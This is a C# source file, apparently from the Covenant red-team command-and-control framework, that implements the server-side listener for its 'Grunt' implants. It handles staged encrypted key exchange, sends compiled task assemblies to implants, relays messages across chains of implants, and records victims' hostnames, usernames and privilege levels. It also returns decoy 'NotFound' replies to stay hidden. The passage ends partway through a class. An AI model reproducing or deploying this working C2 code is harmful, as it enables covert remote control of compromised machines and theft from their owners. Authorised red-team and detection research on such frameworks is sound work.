using System;
using System.IO;
using System.Xml;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Reflection;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

using Microsoft.Rest;
using Microsoft.CodeAnalysis;
using Microsoft.AspNetCore.SignalR.Client;
using Newtonsoft.Json;

using Covenant.Core;
using Covenant.API;
using APIModels = Covenant.API.Models;

namespace Covenant.Models.Listeners
{
    public class InternalListener
    {
        private HubConnection _connection;
        private ICovenantAPI _client;
        private ProfileTransformAssembly _transform;
        private readonly ModelUtilities _utilities = new ModelUtilities();

        internal enum GruntMessageCacheStatus
        {
            Ok,
            NotFound
        }
        internal class GruntMessageCacheInfo
        {
            public APIModels.GruntTasking Tasking { get; set; }
            public string Message { get; set; }
            public GruntMessageCacheStatus Status { get; set; }
        }

        internal class ProfileTransformAssembly
        {
            public int Id { get; set; }
            public byte[] ProfileTransformBytes { get; set; }
        }

        private readonly object _hashCodesLock = new object();
        private readonly HashSet<int> CacheTaskHashCodes = new HashSet<int>();
        private ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>> GruntMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>>();

        public InternalListener()
        {

        }

        public InternalListener(APIModels.Profile profile, string ListenerGuid, string CovenantToken)
        {
            _ = Configure(profile, ListenerGuid, CovenantToken);
        }

        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string CovenantToken)
        {
            _transform = new ProfileTransformAssembly
            {
                ProfileTransformBytes = Compiler.Compile(new Compiler.CompilationRequest
                {
                    Language = Grunts.ImplantLanguage.CSharp,
                    Source = profile.MessageTransform,
                    TargetDotNetVersion = Common.DotNetVersion.NetCore21,
                    References = Common.DefaultReferencesCore21
                })
            };

            X509Certificate2 covenantCert = new X509Certificate2(Common.CovenantPublicCertFile);
            HttpClientHandler clientHandler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
                {
                    return cert.GetCertHashString() == covenantCert.GetCertHashString();
                }
            };
            _client = new CovenantAPI(
                new Uri("https://localhost:7443"),
                new TokenCredentials(CovenantToken),
                clientHandler
            );

            _connection = new HubConnectionBuilder()
                .WithUrl("https://localhost:7443/gruntHub", options =>
                {
                    options.AccessTokenProvider = () => { return Task.FromResult(CovenantToken); };
                    options.HttpMessageHandlerFactory = inner =>
                    {
                        var HttpClientHandler = (HttpClientHandler)inner;
                        HttpClientHandler.ServerCertificateCustomValidationCallback = clientHandler.ServerCertificateCustomValidationCallback;
                        return HttpClientHandler;
                    };
                })
                .Build();
            _connection.Closed += async (error) =>
            {
                await Task.Delay(new Random().Next(0, 5) * 1000);
                await _connection.StartAsync();
            };
            _connection.On<string>("NotifyListener", (guid) => { InternalRead(guid).Wait(); });
            try
            {
                await Task.Delay(5000);
                await _connection.StartAsync();
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("InnerListener SignalRConnection Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
            await _connection.InvokeAsync("JoinGroup", ListenerGuid);
        }

        public static APIModels.Profile ToProfile(Profile profile)
        {
            return new APIModels.Profile
            {
                Id = profile.Id,
                Name = profile.Name,
                Type = (APIModels.ProfileType)Enum.Parse(typeof(APIModels.ProfileType), profile.Type.ToString()),
                Description = profile.Description,
                MessageTransform = profile.MessageTransform
            };
        }

        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, APIModels.GruntTaskingMessage taskingMessage)
        {
            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
        }

        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, byte[] message)
        {
            List<string> path = _client.ApiGruntsByIdPathByCidGet(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
            path.Reverse();
            ModelUtilities.GruntEncryptedMessage finalMessage = null;
            ModelUtilities.GruntEncryptedMessageType messageType = ModelUtilities.GruntEncryptedMessageType.Tasking;
            foreach (string guid in path)
            {
                APIModels.Grunt thisGrunt = _client.ApiGruntsGuidByGuidGet(guid);
                finalMessage = ModelUtilities.GruntEncryptedMessage.Create(
                    thisGrunt,
                    message,
                    messageType
                );
                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
                messageType = ModelUtilities.GruntEncryptedMessageType.Routing;
            }
            return finalMessage;
        }

        private byte[] GetCompressedILAssembly35(string taskname)
        {
            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet35Directory + taskname + ".compiled");
        }

        private byte[] GetCompressedILAssembly40(string taskname)
        {
            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet40Directory + taskname + ".compiled");
        }

        private APIModels.GruntTaskingMessage GetGruntTaskingMessage(APIModels.GruntTasking tasking, APIModels.DotNetVersion version)
        {
            string Message = "";
            switch (tasking.Type)
            {
                case APIModels.GruntTaskingType.Assembly:
                    switch (version)
                    {
                        case APIModels.DotNetVersion.Net35:
                            Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GruntTask.Name));
                            if (tasking.Parameters.Any())
                            {
                                Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                            }
                            break;
                        case APIModels.DotNetVersion.Net40:
                            Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GruntTask.Name));
                            if (tasking.Parameters.Any())
                            {
                                Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                            }
                            break;
                    }
                    break;
                case APIModels.GruntTaskingType.SetOption:
                    if (tasking.Parameters.Count >= 2)
                    {
                        Message = tasking.Parameters[0] + "," + tasking.Parameters[1];
                    }
                    break;
                case APIModels.GruntTaskingType.Connect:
                    if (tasking.Parameters.Count >= 2)
                    {
                        Message = tasking.Parameters[0] + "," + tasking.Parameters[1];
                    }
                    break;
                case APIModels.GruntTaskingType.Disconnect:
                    if (tasking.Parameters.Count >= 1)
                    {
                        Message = tasking.Parameters[0];
                    }
                    break;
                default:
                    Message = string.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                    break;
            }
            return new APIModels.GruntTaskingMessage
            {
                Type = tasking.Type,
                Name = tasking.Name,
                Message = Message,
                Token = tasking.GruntTask == null ? false : tasking.GruntTask.TokenTask
            };
        }

        private int GetTaskingHashCode(APIModels.GruntTasking tasking)
        {
            if (tasking != null)
            {
                int code = tasking.Id ?? default;
                code ^= tasking.GruntId;
                code ^= tasking.GruntTaskId ?? default;
                code ^= tasking.GruntCommandId;
                foreach (char c in tasking.Name) { code ^= c; }
                foreach (char c in tasking.GruntCommand.CommandTime.ToString()) { code ^= c; }
                return code;
            }
            return Guid.NewGuid().GetHashCode();
        }

        private int GetCacheEntryHashCode(GruntMessageCacheInfo cacheEntry)
        {
            return GetTaskingHashCode(cacheEntry.Tasking);
        }

        private void PushCache(string guid, GruntMessageCacheInfo cacheEntry)
        {
            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cacheQueue))
            {
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                    }
                }
            }
            else
            {
                cacheQueue = new ConcurrentQueue<GruntMessageCacheInfo>();
                lock (_hashCodesLock)
                {
                    if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                    {
                        cacheQueue.Enqueue(cacheEntry);
                    }
                }
                this.GruntMessageCache[guid] = cacheQueue;
            }
        }

        private async Task<APIModels.Grunt> GetGruntForGuid(string guid)
        {
            try
            {
                if (!string.IsNullOrEmpty(guid))
                {
                    return await _client.ApiGruntsGuidByGuidGetAsync(guid);
                }
            }
            catch (HttpOperationException) { }
            return null;
        }

        private async Task<APIModels.Grunt> CheckInGrunt(APIModels.Grunt grunt)
        {
            if (grunt == null)
            {
                return null;
            }
            grunt.LastCheckIn = DateTime.UtcNow;
            return await _client.ApiGruntsPutAsync(grunt);
        }

        private async Task<APIModels.GruntTasking> MarkTasked(APIModels.GruntTasking tasking)
        {
            if (tasking == null)
            {
                return null;
            }
            tasking.Status = APIModels.GruntTaskingStatus.Tasked;
            tasking.TaskingTime = DateTime.UtcNow;
            return await _client.ApiTaskingsPutAsync(tasking);
        }

        public async Task<string> Read(string guid)
        {
            if (string.IsNullOrEmpty(guid))
            {
                return "";
            }
            await CheckInGrunt(await GetGruntForGuid(guid));
            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cache))
            {
                if (cache.TryDequeue(out GruntMessageCacheInfo cacheEntry))
                {
                    switch (cacheEntry.Status)
                    {
                        case GruntMessageCacheStatus.NotFound:
                            await this.MarkTasked(cacheEntry.Tasking);
                            throw new ControllerNotFoundException(cacheEntry.Message);
                        case GruntMessageCacheStatus.Ok:
                            await this.MarkTasked(cacheEntry.Tasking);
                            return cacheEntry.Message;
                    }
                }
                return "";
            }
            await InternalRead(guid);
            return "";
        }

        private async Task InternalRead(string guid)
		{
            try
			{
                APIModels.Grunt grunt = await CheckInGrunt(await GetGruntForGuid(guid));
                if (grunt == null)
                {
                    // Invalid GUID. May not be legitimate Grunt request, respond Ok
                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
                }
                else
                {
                    IList<APIModels.GruntTasking> gruntTaskings = await _client.ApiGruntsByIdTaskingsSearchUninitializedGetAsync(grunt.Id ?? default);
                    if (gruntTaskings == null || gruntTaskings.Count == 0)
                    {
                        // No GruntTasking assigned. Respond with empty template
                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
                    }
                    else
                    {
                        foreach (APIModels.GruntTasking tasking in gruntTaskings)
                        {
                            APIModels.GruntTasking gruntTasking = tasking;
                            if (gruntTasking.Type == APIModels.GruntTaskingType.Assembly && gruntTasking.GruntTask == null)
                            {
                                // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = gruntTasking });
                            }
                            else
                            {
                                gruntTasking.Grunt = gruntTasking.GruntId == grunt.Id ? grunt : await _client.ApiGruntsByIdGetAsync(gruntTasking.GruntId);
                                ModelUtilities.GruntEncryptedMessage message = null;
                                try
                                {
                                    message = this.CreateMessageForGrunt(grunt, gruntTasking.Grunt, this.GetGruntTaskingMessage(gruntTasking, gruntTasking.Grunt.DotNetFrameworkVersion));
                                    // Transform response
                                    string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = gruntTasking });
                                }
                                catch (HttpOperationException)
                                {
                                    gruntTasking.Status = APIModels.GruntTaskingStatus.Aborted;
                                    await _client.ApiTaskingsPutAsync(gruntTasking);
                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                                }
                            }
                        }
                    }
                }
            }
			catch (Exception)
			{
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "" });
            }
		}

        public async Task<string> Write(string guid, string data)
		{
            try
			{
				ModelUtilities.GruntEncryptedMessage message = null;
				try
				{
					string inverted = Common.CovenantEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
					message = JsonConvert.DeserializeObject<ModelUtilities.GruntEncryptedMessage>(inverted);
				}
				catch (Exception)
				{
                    // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return guid;
				}
                APIModels.Grunt egressGrunt;
                try
                {
                    egressGrunt = guid == null ? null : await _client.ApiGruntsGuidByGuidGetAsync(guid);
                }
                catch (HttpOperationException)
                {
                    egressGrunt = null;
                }
                APIModels.Grunt targetGrunt = null;
				try
				{
					targetGrunt = await _client.ApiGruntsGuidByGuidGetAsync(message.GUID);
				}
				catch (HttpOperationException)
				{
                    targetGrunt = null;
                    // Stage0 Guid is OriginalServerGuid + Guid
                    if (message.GUID.Length == 20)
                    {
                        string originalServerGuid = message.GUID.Substring(0, 10);
                        string newGuid = message.GUID.Substring(10);
                        targetGrunt = await _client.ApiGruntsOriginalguidByServerguidGetAsync(originalServerGuid);
                        guid = newGuid;
                        await this.PostStage0(egressGrunt, targetGrunt, message, guid);
                        return guid;
                    }
                    else
                    {
                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return guid;
                    }
                }
				switch (targetGrunt.Status)
				{
					case APIModels.GruntStatus.Uninitialized:
						await this.PostStage0(egressGrunt, targetGrunt, message, guid);
                        return guid;
					case APIModels.GruntStatus.Stage0:
						await this.PostStage1(egressGrunt, targetGrunt, message, message.GUID);
                        return message.GUID;
					case APIModels.GruntStatus.Stage1:
						await this.PostStage2(egressGrunt, targetGrunt, message, message.GUID);
                        return message.GUID;
					case APIModels.GruntStatus.Stage2:
						await this.RegisterGrunt(egressGrunt, targetGrunt, message, message.GUID);
                        return message.GUID;
					case APIModels.GruntStatus.Active:
						await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
                        return guid;
					case APIModels.GruntStatus.Lost:
						await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
                        return guid;
					default:
                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                        return guid;
                }
			}
			catch
			{
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return guid;
            }
		}

		private async Task PostTask(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage outputMessage, string guid)
		{
            if (targetGrunt == null || egressGrunt == null || egressGrunt.Guid != guid)
			{
                // Invalid GUID. May not be legitimate Grunt request, respond NotFound
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

			string TaskName = outputMessage.Meta;
			if (string.IsNullOrWhiteSpace(TaskName))
			{
                // Invalid task response. This happens on post-register write
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            APIModels.GruntTasking gruntTasking;
			try
			{
				gruntTasking = await _client.ApiGruntsTaskingsByTaskingnameGetAsync(TaskName);
			}
			catch (HttpOperationException)
			{
                // Invalid taskname. May not be legitimate Grunt request, respond NotFound
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

			if (targetGrunt == null)
			{
                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
                // Invalid signature. Almost certainly not a legitimate Grunt request, respond NotFound
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			string taskOutput = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, outputMessage));
			gruntTasking.GruntCommand.CommandOutput = new APIModels.CommandOutput
			{
				Id = 0,
				GruntCommandId = gruntTasking.GruntCommandId,
				Output = taskOutput
			};
			gruntTasking.GruntCommand.CommandOutputId = 0;
			gruntTasking.Status = APIModels.GruntTaskingStatus.Completed;
			gruntTasking.CompletionTime = DateTime.UtcNow;
            gruntTasking.GruntCommand = await _client.ApiCommandsPutAsync(gruntTasking.GruntCommand);
            await _client.ApiTaskingsPutAsync(gruntTasking);
            lock (_hashCodesLock)
            {
                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(gruntTasking));
            }
            if(gruntTasking.Type == APIModels.GruntTaskingType.SetOption || gruntTasking.Type == APIModels.GruntTaskingType.Exit)
            {
                targetGrunt = await _client.ApiGruntsByIdGetAsync(targetGrunt.Id ?? default);
            }
            await CheckInGrunt(targetGrunt);
            return;
		}

		private async Task PostStage0(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage0Response, string guid)
		{
			if (targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
			{
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			bool egressGruntExists = egressGrunt != null;

			if (targetGrunt.Status != APIModels.GruntStatus.Uninitialized)
			{
                // We create a new Grunt if this one is not uninitialized
                APIModels.Grunt tempModel = new APIModels.Grunt
				{
					Id = 0,
					Name = Utilities.CreateShortGuid(),
					Guid = guid,
					OriginalServerGuid = Utilities.CreateShortGuid(),
					Status = APIModels.GruntStatus.Stage0,
					ListenerId = targetGrunt.ListenerId,
					Listener = targetGrunt.Listener,
                    ImplantTemplateId = targetGrunt.ImplantTemplateId,
                    ImplantTemplate = targetGrunt.ImplantTemplate,
					GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
					SmbPipeName = targetGrunt.SmbPipeName,
					Delay = targetGrunt.Delay,
					JitterPercent = targetGrunt.JitterPercent,
					KillDate = targetGrunt.KillDate,
					ConnectAttempts = targetGrunt.ConnectAttempts,
					DotNetFrameworkVersion = targetGrunt.DotNetFrameworkVersion,
					LastCheckIn = DateTime.UtcNow
				};
				targetGrunt = await _client.ApiGruntsPostAsync(tempModel);
			}
			else
			{
				targetGrunt.Status = APIModels.GruntStatus.Stage0;
				targetGrunt.Guid = guid;
				targetGrunt.LastCheckIn = DateTime.UtcNow;
				targetGrunt = await _client.ApiGruntsPutAsync(targetGrunt);
			}
			if (!egressGruntExists)
			{
				egressGrunt = targetGrunt;
			}

			// EncryptedMessage is the RSA Public Key
			targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
				gruntStage0Response,
				Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
			));
			// Generate negotiated session key
			using (Aes newAesKey = Aes.Create())
			{
				newAesKey.GenerateKey();
				targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
				await _client.ApiGruntsPutAsync(targetGrunt);
			}

			if (egressGruntExists)
			{
				// Add this as Child grunt to Grunt that connects it
				List<APIModels.GruntTasking> taskings = _client.ApiTaskingsGet().ToList();
                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
                APIModels.GruntTasking connectTasking = taskings.Where(GT => GT.Type == APIModels.GruntTaskingType.Connect && GT.Status == APIModels.GruntTaskingStatus.Progressed).Reverse().FirstOrDefault();
				if (connectTasking == null)
				{
                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                    return;
                }
                APIModels.GruntTaskingMessage tmessage = this.GetGruntTaskingMessage(connectTasking, targetGrunt.DotNetFrameworkVersion);
				targetGrunt.Hostname = tmessage.Message.Split(",")[0];
				await _client.ApiGruntsPutAsync(targetGrunt);
				connectTasking.Status = APIModels.GruntTaskingStatus.Completed;
				await _client.ApiTaskingsPutAsync(connectTasking);
			}

			byte[] rsaEncryptedBytes = EncryptUtilities.GruntRSAEncrypt(targetGrunt, Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey));
			ModelUtilities.GruntEncryptedMessage message = null;
			try
			{
				message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes);
			}
			catch (HttpOperationException)
			{
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
            // Transform response
            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

		private async Task PostStage1(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage1Response, string guid)
		{
            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			if (egressGrunt == null)
			{
				egressGrunt = targetGrunt;
			}
			byte[] challenge1 = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage1Response);
			byte[] challenge2 = new byte[4];
			using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
			{
				rng.GetBytes(challenge2);
			}
			// Save challenge to compare on response
			targetGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
			targetGrunt.Status = APIModels.GruntStatus.Stage1;
			targetGrunt.LastCheckIn = DateTime.UtcNow;
			await _client.ApiGruntsPutAsync(targetGrunt);

			ModelUtilities.GruntEncryptedMessage message;
			try
			{
				message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
			}
			catch (HttpOperationException)
			{
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

            // Transform response
            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

		private async Task PostStage2(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage2Response, string guid)
		{
            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			if (egressGrunt == null)
			{
				egressGrunt = targetGrunt;
			}
			byte[] challenge2test = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage2Response);
			if (targetGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
			{
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			targetGrunt.Status = APIModels.GruntStatus.Stage2;
			targetGrunt.LastCheckIn = DateTime.UtcNow;
			await _client.ApiGruntsPutAsync(targetGrunt);
            byte[] GruntExecutorAssembly = await this._client.ApiGruntsByIdCompileexecutorGetAsync(targetGrunt.Id ?? default);

			ModelUtilities.GruntEncryptedMessage message;
			try
			{
				message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, GruntExecutorAssembly);
			}
			catch (HttpOperationException)
			{
                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject("")));
                throw new ControllerNotFoundException(emptyTransformed);
			}

            // Transform response
            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

		private async Task RegisterGrunt(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntMessage, string guid)
		{
			if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
                // Always return NotFound, don't give away unnecessary info
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }
			if (egressGrunt == null)
			{
				egressGrunt = targetGrunt;
			}
			string message = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, gruntMessage));
            // todo: try/catch on deserialize?
            APIModels.Grunt grunt = JsonConvert.DeserializeObject<APIModels.Grunt>(message);
            targetGrunt.IpAddress = grunt.IpAddress;
			targetGrunt.Hostname = grunt.Hostname;
			targetGrunt.OperatingSystem = grunt.OperatingSystem;
			targetGrunt.UserDomainName = grunt.UserDomainName;
			targetGrunt.UserName = grunt.UserName;
			targetGrunt.Status = APIModels.GruntStatus.Active;
			targetGrunt.Integrity = grunt.Integrity;
			targetGrunt.Process = grunt.Process;
			targetGrunt.LastCheckIn = DateTime.UtcNow;

			await _client.ApiGruntsPutAsync(targetGrunt);

            APIModels.GruntTaskingMessage tasking = new APIModels.GruntTaskingMessage
			{
				Message = targetGrunt.Guid,
				Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
				Type = APIModels.GruntTaskingType.Jobs,
				Token = false
			};

			ModelUtilities.GruntEncryptedMessage responseMessage;
			try
			{
				responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
            }
			catch (HttpOperationException)
			{
                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
                return;
            }

			// Transform response
			string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
            return;
        }

        internal static class EncryptUtilities
        {
            // Returns IV (16 bytes) + EncryptedData byte array
            public static byte[] AesEncrypt(byte[] data, byte[] key)
            {
                using (Aes SessionKey = Aes.Create())
                {
                    SessionKey.Mode = Common.AesCipherMode;
                    SessionKey.Padding = Common.AesPaddingMode;
                    SessionKey.GenerateIV();
                    SessionKey.Key = key;

                    byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);

                    return SessionKey.IV.Concat(encrypted).ToArray();
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public static byte[] AesDecrypt(byte[] data, byte[] key)
            {
                using (Aes SessionKey = Aes.Create())
                {
                    SessionKey.IV = data.Take(Common.AesIVLength).ToArray();
                    SessionKey.Key = key;

                    byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
                    return SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }

            // Convenience method for decrypting an EncryptedMessagePacket
            public static byte[] AesDecrypt(ModelUtilities.GruntEncryptedMessage encryptedMessage, byte[] key)
            {
                return AesDecrypt(
                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncryptedMessage)).ToArray(),
                    key
                );
            }

            public static byte[] ComputeHMAC(byte[] data, byte[] key)
            {
                using (HMACSHA256 SessionHmac = new HMACSHA256(key))
                {
                    return SessionHmac.ComputeHash(data);
                }
            }

            public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
            {
                using (HMACSHA256 hmac = new HMACSHA256(key))
                {
                    byte[] calculatedHash = hmac.ComputeHash(hashedBytes);

                    // Should do double hmac?
                    return Enumerable.SequenceEqual(calculatedHash, hash);
                }
            }

            public static byte[] RSAEncrypt(byte[] toEncrypt, string RSAPublicKeyXMLString)
            {
                using (RSA RSAPublicKey = RSA.Create())
                {
                    RSAKeyExtensions.FromXmlString(RSAPublicKey, RSAPublicKeyXMLString);
                    return RSAPublicKey.Encrypt(toEncrypt, RSAEncryptionPadding.OaepSHA1);
                }
            }

            public static byte[] GruntRSAEncrypt(APIModels.Grunt grunt, byte[] toEncrypt)
            {
                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.CovenantEncoding.GetString(Convert.FromBase64String(grunt.GruntRSAPublicKey)));
            }
        }

        internal class ModelUtilities
        {
            public string ProfileTransform(ProfileTransformAssembly ProfileTransformAssembly, byte[] bytes)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("HttpMessageTransform");
                return (string)t.GetMethod("Transform").Invoke(null, new object[] { bytes });
            }

            public byte[] ProfileInvert(ProfileTransformAssembly ProfileTransformAssembly, string str)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("HttpMessageTransform");
                return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
            }

            public enum GruntEncryptedMessageType
            {
                Routing,
                Tasking
            }

            public class GruntEncryptedMessage
            {
                public string GUID { get; set; }
                public GruntEncryptedMessageType Type { get; set; }
